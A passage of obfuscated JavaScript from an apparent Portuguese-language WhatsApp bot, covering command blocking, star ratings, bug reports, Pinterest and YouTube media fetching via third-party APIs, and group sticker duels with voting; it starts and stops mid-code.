                return _0x403602("Tá louco maluco?, Quer banir o comando de desbloquear comando?");
              }
              if (!getComandoBlock(_0x4f1071).includes(_0x40e45c[0])) {
                return _0x403602("Este comando já está  desbloqueado");
              }
              deleteComandos(_0x4f1071, _0x40e45c[0]);
              _0x403602("O comando " + _0x40e45c[0] + " Foi desblockeado");
              break;
            case "listacomandos":
              tkks = "╭─*「 *COMANDOS BLOCK* 」\n";
              for (let _0x55840 of getComandoBlock(_0x4f1071)) {
                tkks += "│+  " + _0x55840 + "\n";
              }
              tkks += "│+ Total : " + getComandoBlock(_0x4f1071).length + "\n╰──────*「 *" + NomeDoBot + "* 」*────";
              const _0x4775af = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: tkks.trim()
              }, _0x4775af);
              break;
            case "avalie":
              try {
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: {
                      text: "AVALIAÇÃO O QUÃO BOM"
                    },
                    footer: {
                      text: "O QUÃO BOM?"
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "░ AVALIE ░",
                          sections: [{
                            title: "Avaliações",
                            rows: [{
                              id: _0x1d93be + "avalia1",
                              title: "★☆☆☆☆",
                              description: "> muito ruim"
                            }, {
                              id: _0x1d93be + "avalia2",
                              title: "★★☆☆☆",
                              description: "> pode melhorar"
                            }, {
                              id: _0x1d93be + "avalia3",
                              title: "★★★☆☆",
                              description: "> mais o menos"
                            }, {
                              id: _0x1d93be + "avalia4",
                              title: "★★★★☆",
                              description: "> bom"
                            }, {
                              id: _0x1d93be + "avalia5",
                              title: "★★★★★",
                              description: "> muito bom"
                            }]
                          }]
                        })
                      }]
                    }
                  }
                }, {});
              } catch (_0x28811c) {
                console.log(_0x28811c);
              }
              break;
            case "avalia1":
              if (numerosAvaliados.has(_0x32e455)) {
                _0x403602("[❗] Você já enviou uma avaliação anteriormente. Obrigado pelo seu feedback!");
              } else {
                const _0x55cf14 = _0x2e320b.slice(8);
                var _0x3dfd74 = _0x302296.participant;
                tdptls = "[ Avaliação ]\n★☆☆☆☆\nmuito ruim\nDe: wa.me/" + _0x32e455.split("@s.whatsapp.net")[0] + "\n";
                const _0x51ccfd = {
                  text: tdptls
                };
                const _0x41996e = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x3a52d1, _0x51ccfd, _0x41996e);
                _0x403602("🥲mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.");
                numerosAvaliados.add(_0x32e455);
              }
              break;
            case "avalia2":
              if (numerosAvaliados.has(_0x32e455)) {
                _0x403602("[❗] Você já enviou uma avaliação anteriormente. Obrigado pelo seu feedback!");
              } else {
                const _0x2cdaad = _0x2e320b.slice(8);
                var _0x3dfd74 = _0x302296.participant;
                tdptls = "[ Avaliação ]\n★★☆☆☆\npode melhorar\nDe: wa.me/" + _0x32e455.split("@s.whatsapp.net")[0] + "\n";
                const _0x40c925 = {
                  text: tdptls
                };
                const _0x1b7aa6 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x3a52d1, _0x40c925, _0x1b7aa6);
                _0x403602("🙂mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.");
                numerosAvaliados.add(_0x32e455);
              }
              break;
            case "avalia3":
              if (numerosAvaliados.has(_0x32e455)) {
                _0x403602("[❗] Você já enviou uma avaliação anteriormente. Obrigado pelo seu feedback!");
              } else {
                const _0xe4ac7e = _0x2e320b.slice(8);
                var _0x3dfd74 = _0x302296.participant;
                tdptls = "[ Avaliação ]\n★★★☆☆\nmais o menos\nDe: wa.me/" + _0x32e455.split("@s.whatsapp.net")[0] + "\n";
                const _0x3e355f = {
                  text: tdptls
                };
                const _0x18ade4 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x3a52d1, _0x3e355f, _0x18ade4);
                _0x403602("🙃mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.");
                numerosAvaliados.add(_0x32e455);
              }
              break;
            case "avalia4":
              if (numerosAvaliados.has(_0x32e455)) {
                _0x403602("[❗] Você já enviou uma avaliação anteriormente. Obrigado pelo seu feedback!");
              } else {
                const _0x101559 = _0x2e320b.slice(8);
                var _0x3dfd74 = _0x302296.participant;
                tdptls = "[ Avaliação ]\n★★★★☆\nbom\nDe: wa.me/" + _0x32e455.split("@s.whatsapp.net")[0] + "\n";
                const _0x9856d2 = {
                  text: tdptls
                };
                const _0x1cd3de = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x3a52d1, _0x9856d2, _0x1cd3de);
                _0x403602("😊mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.");
                numerosAvaliados.add(_0x32e455);
              }
              break;
            case "avalia5":
              if (numerosAvaliados.has(_0x32e455)) {
                _0x403602("[❗] Você já enviou uma avaliação anteriormente. Obrigado pelo seu feedback!");
              } else {
                const _0x57405c = _0x2e320b.slice(8);
                var _0x3dfd74 = _0x302296.participant;
                tdptls = "[ Avaliação ]\n★★★★★\nmuito bom\nDe: wa.me/" + _0x32e455.split("@s.whatsapp.net")[0] + "\n";
                const _0x5a099f = {
                  text: tdptls
                };
                const _0x2207d5 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x3a52d1, _0x5a099f, _0x2207d5);
                _0x403602("🤩 mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.");
                numerosAvaliados.add(_0x32e455);
              }
              break;
            case "bug":
              const _0x49c17f = _0x2e320b.slice(5);
              if (_0x40e45c.length <= 1) {
                return _0x403602("Exemplo: " + _0x1d93be + "bug \"ocorreu um erro no comando sticker\"");
              }
              const _0x783256 = {
                quoted: _0x302296
              };
              if (_0x40e45c.length >= 800) {
                return _0x263319.sendMessage(_0x4f1071, {
                  text: "Máximo 800 caracteres"
                }, _0x783256);
              }
              var _0x3dfd74 = _0x302296.participant;
              teks1 = "[ Problema ]\nDe: wa.me/" + _0x32e455.split("@s.whatsapp.net")[0] + "\nErro ou bug: " + _0x49c17f;
              const _0x5a665a = {
                text: teks1
              };
              const _0x569aa6 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x3a52d1, _0x5a665a, _0x569aa6);
              _0x403602("mensagem enviada ao meu dono, se enviar muitas mensagens repetida por zoueiras, você sera banido de utilizar os comandos do bot.");
              break;
            case "sugestão":
            case "sugestao":
              const _0x10a59c = _0x2e320b.slice(10);
              if (_0x40e45c.length <= 1) {
                return _0x403602("Exemplo: " + _0x1d93be + "sugestao \"Opa, crie um comando tal, que ele funcione de tal maneira, isso será muito bom, não só pra mim, mas pra vários fazer isso..\"");
              }
              const _0x4b6cd2 = {
                quoted: _0x302296
              };
              if (_0x40e45c.length >= 800) {
                return _0x263319.sendMessage(_0x4f1071, {
                  text: "Máximo 800 caracteres"
                }, _0x4b6cd2);
              }
              var _0x3dfd74 = _0x302296.participant;
              sug = "[ Sugestões ]\nDe: wa.me/" + _0x32e455.split("@s.whatsapp.net")[0] + "\n: " + _0x10a59c;
              const _0x1add55 = {
                text: sug
              };
              const _0xf828f9 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x3a52d1, _0x1add55, _0xf828f9);
              _0x403602("mensagem enviada ao meu dono, obrigado pela sugestão, tentar ouvir o máximo possível de sugestões.");
              break;
            case "gimage":
            case "imagem":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " naruto");
                }
                const _0x45e388 = await fetchJson(SITE_JEFF_APIS + "/api/gimage?txt=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                if (_0x45e388.error) {
                  return _0x403602("Erro ao buscar imagem.");
                }
                if (_0x45e388.length === 0) {
                  return _0x403602("Nenhuma imagem encontrada.");
                }
                const _0x526cf0 = _0x45e388[Math.floor(Math.random() * _0x45e388.length)];
                const _0x33ea88 = {
                  url: _0x526cf0.url
                };
                const _0x3e0d9f = {
                  image: _0x33ea88
                };
                _0x263319.sendMessage(_0x4f1071, _0x3e0d9f).catch(() => {
                  return _0x403602("Erro ao enviar a imagem.");
                });
              } catch (_0x3f6b4f) {
                return _0x403602("Erro ao buscar imagem.");
              }
              break;
            case "pinterest2":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " nome da imagem ou link do video");
                }
                if (_0x1d6557.includes("br.pinterest.com") || _0x1d6557.includes("pin.it")) {
                  const _0x24bdf5 = {
                    text: "⏳",
                    key: _0x302296.key
                  };
                  const _0x8546b = {
                    react: _0x24bdf5
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x8546b);
                  if (_0x1d6557.includes("br.pinterest.com") || _0x1d6557.includes("pin.it")) {
                    const _0x53a0ea = await fetchJson(SITE_JEFF_APIS + "/api/pinterest_mp4?url=" + _0x1d6557.trim() + "&apikey=" + _0x512d5e);
                    const _0x446c82 = _0x53a0ea.resultado.download_vid;
                    const _0x42cf9f = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x36ee83 = {
                      react: _0x42cf9f
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x36ee83);
                    const _0x316497 = {
                      url: _0x446c82
                    };
                    const _0x4d563c = {
                      video: _0x316497,
                      mimetype: "video/mp4"
                    };
                    const _0x11f09c = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x4d563c, _0x11f09c);
                  }
                } else {
                  const _0x39c3ca = SITE_JEFF_APIS + "/api/pinterest?text=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                  const _0x1f8205 = {
                    url: _0x39c3ca
                  };
                  const _0x287367 = {
                    image: _0x1f8205
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x287367);
                  const _0x5a614c = {
                    text: "✅",
                    key: _0x302296.key
                  };
                  const _0x2aa4b2 = {
                    react: _0x5a614c
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x2aa4b2);
                }
              } catch (_0x1a568f) {
                console.error(_0x1a568f);
                const _0x351f19 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x5719c1 = {
                  react: _0x351f19
                };
                _0x263319.sendMessage(_0x4f1071, _0x5719c1);
                const _0x466092 = {
                  body: "" + infoerror,
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x466092);
              }
              break;
            case "pinterest_video":
              try {
                const _0x256044 = _0x40e45c.join(" ");
                if (!_0x256044) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " link do vídeo do Pinterest");
                }
                if (_0x256044.includes("br.pinterest.com") || _0x256044.includes("pin.it")) {
                  const _0x132947 = {
                    text: "⏳",
                    key: _0x302296.key
                  };
                  const _0x45af25 = {
                    react: _0x132947
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x45af25);
                  const _0x18645a = await fetchJson(SITE_JEFF_APIS + "/api/pinterest_mp4?url=" + _0x256044.trim() + "&apikey=" + _0x512d5e);
                  if (_0x18645a.resultado && _0x18645a.resultado.download_vid) {
                    const _0x192240 = _0x18645a.resultado.download_vid;
                    const _0xc840d0 = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x759ab3 = {
                      react: _0xc840d0
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x759ab3);
                    const _0x274f47 = {
                      url: _0x192240
                    };
                    const _0x40f0e0 = {
                      video: _0x274f47,
                      mimetype: "video/mp4"
                    };
                    const _0x1dfd06 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x40f0e0, _0x1dfd06);
                  } else {
                    const _0x2945ee = {
                      body: "Não foi possível encontrar o vídeo. Verifique o link e tente novamente.",
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x2945ee);
                  }
                } else {
                  const _0x14f458 = {
                    body: "Por favor, envie um link válido do Pinterest.",
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x14f458);
                }
              } catch (_0x4b8d25) {
                console.error(_0x4b8d25);
                const _0x1f14b9 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x245081 = {
                  react: _0x1f14b9
                };
                _0x263319.sendMessage(_0x4f1071, _0x245081);
                const _0x51dc27 = {
                  body: "" + infoerror,
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x51dc27);
              }
              break;
            case "triggered":
              try {
                if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925 || !_0x5760e9) && !_0x1d6557.length <= 1) {
                  _0xbbe906 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  owgi = await getFileBuffer(_0xbbe906, "image");
                  res = await upload(owgi);
                  bld = await getBuffer("https://api.bronxyshost.com.br/api-bronxys/trigger?url=" + res + "&apikey=" + _0x44a335);
                  rst = await upload(bld);
                  enviarfiguUrl(_0x263319, _0x4f1071, rst, _0x302296);
                } else {
                  _0x403602("Marque uma imagem no WhatsApp...");
                }
              } catch {
                _0x403602("Erro");
              }
              break;
            case "imgpralink":
            case "gerarlink":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                try {
                  let _0x33919f = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  let _0x191d57 = await getFileBuffer(_0x33919f, "image");
                  UploadServer = await upload(_0x191d57);
                  await _0x403602("" + UploadServer);
                } catch (_0x2c461e) {
                  const _0x1b3e46 = {
                    reagir: "😿"
                  };
                  await _0x403602(mess.error(), _0x1b3e46);
                }
              } else {
                const _0xb17c48 = {
                  reagir: "😾"
                };
                await _0x403602("Envie ou responda uma *imagem* com o comando *" + (_0x1d93be + _0x3dec88) + "* - Faz upload da mídia para o servidor e após a solicitação retorna o URL!", _0xb17c48);
              }
              break;
            case "videourl":
            case "videopralink":
            case "videopralink2":
            case "imgpralink2":
            case "audiopralink":
              try {
                if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) && !_0x1d6557.length <= 1) {
                  _0x403602(enviar.espere);
                  const _0x5759a9 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x37aa99 = await getFileBuffer(_0x5759a9, "image");
                  const _0x385d23 = await upload2(_0x37aa99);
                  _0x403602(_0x385d23);
                } else if ((_0x13c612 && _0x302296.message.videoMessage.seconds < 30 || _0x5760e9 && _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 30) && !_0x1d6557.length <= 1) {
                  _0x403602(enviar.espere);
                  const _0x384f19 = _0x5760e9 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.videoMessage : _0x302296.message.videoMessage;
                  const _0x3e640c = await getFileBuffer(_0x384f19, "video");
                  const _0x116388 = await upload2(_0x3e640c);
                  _0x403602(_0x116388);
                } else if ((_0x13c612 && _0x302296.message.audioMessage.seconds < 300 || _0x6aebb1 && _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage.seconds < 300) && !_0x1d6557.length <= 1) {
                  _0x403602(enviar.espere);
                  const _0x46bf13 = _0x6aebb1 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.audioMessage : _0x302296.message.audioMessage;
                  const _0x4b701a = await getFileBuffer(_0x46bf13, "audio");
                  const _0x4168af = await upload2(_0x4b701a);
                  _0x403602("" + _0x4168af);
                } else {
                  _0x403602("Você deve marcar uma imagem, vídeo de até 30 segundos ou áudio de até 5 minutos.");
                }
              } catch (_0x1d79ba) {
                console.error("Erro:", _0x1d79ba);
                _0x403602("Ocorreu algum erro, desculpe 😔/ O limite do tamanho de vídeo é até 30 segundos e o limite para áudio é até 5 minutos.");
              }
              break;
            case "ytsearch2":
            case "ytsearch":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Digite o nome de algum vídeo ou música que deseja encontrar..");
                }
                _0x3529b0 = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                ABC = "-\t".repeat(13) + "\n\n";
                for (var _0xc3d45a of _0x3529b0.resultado) {
                  ABC += "Titulo: " + _0xc3d45a.title + "\nUrl: " + _0xc3d45a.url + "\nTempo: " + _0xc3d45a.duration + "\nPostado: " + _0xc3d45a.ago + "\n\nDescrição: " + _0xc3d45a.description + "\n\n";
                  ABC += "-\t".repeat(13) + "\n\n";
                }
                _0x403602(ABC);
              } catch (_0x31a88d) {
                return _0x403602("Erro.. avise ao meu criador 🥺");
              }
              break;
            case "infoduelo":
              _0x5b6fe5("Olá @" + _0x32e455.split("@")[0] + ", irei informar sobre o comando duelo, ele é usado mais para grupos de figurinhas, alguns grupo de figurinhas, gosta de interagir através de figurinhas, ae o Adm grupo, da a oportunidade de 2 usuários que tem uma interação bem top no momento, ae eles 2 realiza o duelo, mas só eles pode enviar mensagens no grupo, ae vão trocando figurinhas.. Depois vai ter uma votação, e o pessoal do grupo que assistiu, vota no qual foi o melhor no duelo de figurinhas kkk, Mas vamos lá, irei mostrar o comando.. \n\nO exemplo é o seguinte:\n\n" + _0x1d93be + "duelo @fulano1 @fulano2/12:30\n\nPrimeiro você marca os 2 que vão duelo, e a /, depois o horário que vai acabar o duelo, e vai iniciar a votação.. \n\nQuando chegar no horário determinado, o bot vai enviar uma lista para os usuários do grupo decidir, votar em quem foi melhor no duelo, depois o Adm pode encerrar a votação, e ver quantidade de votos.. \n\nEntão é isso, boa sorte.");
              break;
            case "duelo_v1":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!fs.existsSync("./DADOS/duelo_" + _0x4f1071 + ".json")) {
                return _0x403602("Nenhum duelo foi iniciado nesse grupo..");
              }
              dl_JsOn = JSON.parse(fs.readFileSync("./DADOS/duelo_" + _0x4f1071 + ".json"));
              if (JSON.stringify(dl_JsOn).includes(_0x32e455)) {
                return _0x403602("Você já votou, não pode votar novamente.. / ou você está participando do duelo, não pode votar..");
              }
              dl_JsOn.voto_usu1.push(_0x32e455);
              fs.writeFileSync("./DADOS/duelo_" + _0x4f1071 + ".json", JSON.stringify(dl_JsOn, null, 2));
              _0x403602("Votou com sucesso, aguarde o restante votar, para eu anunciar o vencedor..");
              break;
            case "duelo_v2":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!fs.existsSync("./DADOS/duelo_" + _0x4f1071 + ".json")) {
                return _0x403602("Nenhum duelo foi iniciado nesse grupo..");
              }
              dl_JsOn = JSON.parse(fs.readFileSync("./DADOS/duelo_" + _0x4f1071 + ".json"));
              if (JSON.stringify(dl_JsOn).includes(_0x32e455)) {
                return _0x403602("Você já votou, não pode votar novamente.. / ou você está participando do duelo, não pode votar..");
              }
              dl_JsOn.voto_usu2.push(_0x32e455);
              fs.writeFileSync("./DADOS/duelo_" + _0x4f1071 + ".json", JSON.stringify(dl_JsOn, null, 2));
              _0x403602("Votou com sucesso, aguarde o restante votar, para eu anunciar o vencedor..");
              break;
            case "zerar_duelo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Apenas administrador..");
              }
              if (!fs.existsSync("./DADOS/duelo_" + _0x4f1071 + ".json")) {
                return _0x403602("Nenhum duelo foi iniciado nesse grupo..");
              }
              DLT_FL("./DADOS/duelo_" + _0x4f1071 + ".json");
              _0x403602("Duelo resetado / cancelado..");
              break;
            case "terminar_vot_duelo":
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x150e9e && !_0x35021e) {
                  return _0x403602("Apenas administrador..");
                }
                if (!fs.existsSync("./DADOS/duelo_" + _0x4f1071 + ".json")) {
                  return _0x403602("Nenhum duelo foi iniciado nesse grupo..");
                }
                dl_JsOn = JSON.parse(fs.readFileSync("./DADOS/duelo_" + _0x4f1071 + ".json"));
                if (dl_JsOn.voto_usu1.length == dl_JsOn.voto_usu2.length) {
                  return _0x403602("Não foi possível terminar a votação, pois está empate, não tem como eu anunciar um vencedor..");
                }
                blu_1 = "";
                for (_0xc3d45a of dl_JsOn.voto_usu1) {
                  blu_1 += _0xc3d45a.split("@")[0] + "\n";
                }
                blu_2 = "";
                for (_0xc3d45a of dl_JsOn.voto_usu2) {
                  blu_2 += _0xc3d45a.split("@")[0] + "\n";
                }
                var _0x5c278a = "[ Ganhador: @" + (dl_JsOn.voto_usu1.length > dl_JsOn.voto_usu2.length ? dl_JsOn.usu1.split("@")[0] : dl_JsOn.usu2.split("@")[0]) + " ]\n\nUsuário _- 1 - @" + dl_JsOn.usu1.split("@")[0] + "\n\nQuantidade de votos: " + dl_JsOn.voto_usu1.length + "\n\nPessoas que votou:\n" + blu_1 + "\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n\nUsuário _- 2 - @" + dl_JsOn.usu2.split("@")[0] + "\n\nQuantidade de votos: " + dl_JsOn.voto_usu2.length + "\n\nPessoas que votou:\n" + blu_2;
                try {
                  pfimg = await _0x263319.profilePictureUrl((dl_JsOn.voto_usu1.length > dl_JsOn.voto_usu2.length ? dl_JsOn.usu1.split("@")[0] : dl_JsOn.usu2.split("@")[0]) + "@c.us", "image");
                } catch {
                  pfimg = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                ;
                bl1 = await getBuffer(pfimg);
                bl_up = await upload(bl1);
                blar = await getBuffer("https://eruakorl.sirv.com/jefferson_ddos/ganhador.jpg?text.0.text=" + (dl_JsOn.voto_usu1.length > dl_JsOn.voto_usu2.length ? dl_JsOn.usu1.split("@")[0] : dl_JsOn.usu2.split("@")[0]) + "&text.0.position.gravity=center&text.0.position.y=22%25&text.0.size=62&text.0.color=000000&text.0.font.family=Source%20Serif%20Pro&text.0.font.weight=700&text.0.font.style=italic");
                bli = await upload(blar);
                _0x263319.sendMessage(_0x4f1071, {
                  image: {
                    url: "https://api.bronxyshost.com.br/api-bronxys/duelo_win/?url=" + bl_up + "&fundo=" + bli + "&nmr2=122&nmr2_2=175&nmr2_3=205&nmr2_4=205&largura=450&altura=672&apikey=" + _0x44a335
                  },
                  caption: _0x5c278a,
                  mentions: [dl_JsOn.usu1, dl_JsOn.usu2]
                });
              } catch {
                _0x403602("Erro, tente novamente..");
              }
              break;
            case "duelo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Apenas administrador..");
              }
              try {
                TXTEX = "Olá, para iniciar o duelo, você precisa marcar 2 pessoas, depois colocar / e o horario que vai começar a votação..\nExemplo: " + (_0x1d93be + _0x3dec88) + " @fulano1 @fulano2/12:30\nColoquei para que ele acabe o duelo às 12:30 e vai ser enviado uma lista para votar..";
                if (!_0x5b0a24 || _0x5b0a24?.length > 2) {
                  return _0x403602(TXTEX);
                }
                if (!_0x1d6557.trim().includes("/")) {
                  return _0x403602(TXTEX);
                }
                try {
                  pfimg = await _0x263319.profilePictureUrl(_0x5b0a24[0].split("@")[0] + "@c.us", "image");
                } catch {
                  pfimg = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                ;
                bl1 = await getBuffer(pfimg);
                bl_up = await upload(bl1);
                try {
                  pfimg2 = await _0x263319.profilePictureUrl(_0x5b0a24[1].split("@")[0] + "@c.us", "image");
                } catch {
                  pfimg2 = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                ;
                bl2 = await getBuffer(pfimg2);
                bl_up2 = await upload(bl2);
                gtb = await getBuffer("https://eruakorl.sirv.com/jefferson_ddos/vs.jpg?text.0.text=" + _0x5b0a24[0].split("@")[0] + "&text.0.position.gravity=southwest&text.0.position.x=6%25&text.0.position.y=-2%25&text.0.size=32&text.0.color=ff0000&text.0.font.family=Source%20Serif%20Pro&text.0.font.weight=700&text.0.font.style=italic&text.0.background.opacity=100&text.1.text=" + _0x5b0a24[1].split("@")[0] + "&text.1.position.x=-7%25&text.1.position.y=-2%25&text.1.size=32&text.1.color=0022ff&text.1.font.family=Source%20Serif%20Pro&text.1.font.weight=700&text.1.font.style=italic");
                txtimg = await upload(gtb);
                _0x263319.sendMessage(_0x4f1071, {
                  image: {
                    url: "https://api.bronxyshost.com.br/api-bronxys/duelo?url=" + bl_up + "&url2=" + bl_up2 + "&fundo=" + txtimg + "&nmr1=595&nmr1_2=102&nmr1_3=157&nmr1_4=157&nmr2=117&nmr2_2=100&nmr2_3=150&nmr2_4=150&largura=870&altura=360&apikey=" + _0x44a335
                  },
                  caption: "Duelo iniciado:\n\n@" + _0x5b0a24[0].split("@")[0] + "\n\t\t\t\t\t~ VS ~\n@" + _0x5b0a24[1].split("@")[0] + "\n\nNenhum usuário do grupo deve atrapalhar o duelo dos 2, quem enviar mensagem sem esta participando do duelo, estará descumprido as regras e poderá ser removido por um Administrador\n\nBoa sorte aos 2..",
                  mentions: _0x5b0a24
                }).catch(_0x2d6092 => {
                  _0x403602("Erro");
                });
                await sleep(1000);
                fs.writeFileSync("./DADOS/duelo_" + _0x4f1071 + ".json", JSON.stringify({
                  usu1: _0x5b0a24[0],
                  usu2: _0x5b0a24[1],
                  iniciar_vot: _0x1d6557.trim().split("/")[1],
                  iniciou: false,
                  voto_usu1: [],
                  voto_usu2: []
                }, null, 2));
              } catch {
                _0x403602("Erro, tente novamente..");
              }
              break;
              const _0x1d094e = fs.readFileSync("./logo.jpg");
            case "play3":
              try {
                if (!_0x1d6557) {
                  return _0x403602("- Exemplo: " + _0x1d93be + "play nome da música\na música será baixada, só basta escolher áudio ou vídeo, se não baixar, o YouTube privou de não baixarem, ou algo do tipo..");
                }
                const _0x5b046b = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc/videos?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x2c07a6 = {
                  url: _0x5b046b.resultado[0].image
                };
                const _0x2f9e34 = {
                  image: _0x2c07a6
                };
                const _0x2638c4 = {
                  upload: _0x263319.waUploadToServer
                };
                let _0x17bbc8 = await prepareWAMessageMedia(_0x2f9e34, _0x2638c4);
                if (_0x3fb600) {
                  if (_0x5b3d2b < 3) {
                    return _0x403602("Você não tem Golds suficiente para completar esta ação, tente novamente após conseguir mais...");
                  }
                  setTimeout(async () => {
                    await _0x4b05d2(3, _0x32e455);
                  }, 1000);
                }
                const _0x1d86c1 = "\n    ๖ۣ• Titulo: " + _0x5b046b.resultado[0].title + "\n    ๖ۣ• Tempo: " + _0x5b046b.resultado[0].timestamp + "\n    ๖ۣ• Postado: " + _0x5b046b.resultado[0].ago + "\n    ๖ۣ• Descrição: " + _0x5b046b.resultado[0].description + "\n\n    ■■■■■ 100% \n\n    E᥉ᥴ᥆ᥣhᥲ ᥙ꧑ᥲ ᥆ρᥴᥲ᥆... \n    ";
                const _0x2fa6ec = {
                  hasMediaAttachment: true,
                  imageMessage: _0x17bbc8.imageMessage
                };
                const _0x4541d6 = {
                  text: _0x1d86c1
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    header: _0x2fa6ec,
                    headerType: "IMAGE",
                    body: _0x4541d6,
                    nativeFlowMessage: {
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "᭡ Aᥙdι᥆",
                          id: _0x1d93be + "playbt " + _0x5b046b.resultado[0].url,
                          quick_reply: "᭡ Aᥙdι᥆"
                        })
                      }, {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "᭡ Vιdᥱ᥆",
                          id: _0x1d93be + "play_vdbt " + _0x5b046b.resultado[0].url,
                          quick_reply: "᭡ Vιdᥱ᥆"
                        })
                      }]
                    }
                  }
                }, {});
              } catch (_0x10027d) {
                console.error(_0x10027d);
              }
              break;
            case "g":
              const _0x3632 = {
                upload: _0x263319.waUploadToServer
              };
              let _0x23bbbb = await prepareWAMessageMedia({
                image: {
                  url: "https://i.ytimg.com/vi/58xKTGxmeHI/hq720.jpg"
                }
              }, _0x3632);
              const _0xae6331 = {
                hasMediaAttachment: true,
                imageMessage: _0x23bbbb.imageMessage
              };
              _0x263319.relayMessage(_0x4f1071, {
                interactiveMessage: {
                  header: _0xae6331,
                  headerType: "IMAGE",
                  body: {
                    text: "teste"
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "Menu De Lista",
                        sections: [{
                          title: "Escolha Um Botão De Acordo Com Sua Necessidade",
                          highlight_label: "Funcionando? Sim",
                          rows: [{
                            id: _0x1d93be + "menudono",
                            header: "Menu",
                            title: "🥷 Menu consulta 🥷"
                          }]
                        }]
                      })
                    }]
                  }
                }
              }, {});
              break;
            case "playaudiobotao":
              try {
                const _0x454704 = SITE_JEFF_APIS + "/api/dl/ytaudio2?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                const _0x3192b9 = {
                  url: _0x454704
                };
                const _0x1edea8 = {
                  audio: _0x3192b9,
                  mimetype: "audio/mpeg"
                };
                const _0x213e61 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x1edea8, _0x213e61);
                const _0x270731 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x35ef35 = {
                  react: _0x270731
                };
                _0x263319.sendMessage(_0x4f1071, _0x35ef35);
              } catch (_0x179104) {
                return _0x403602("Erro ao processar a solicitação. Tente novamente mais tarde.");
                const _0x329f6a = {
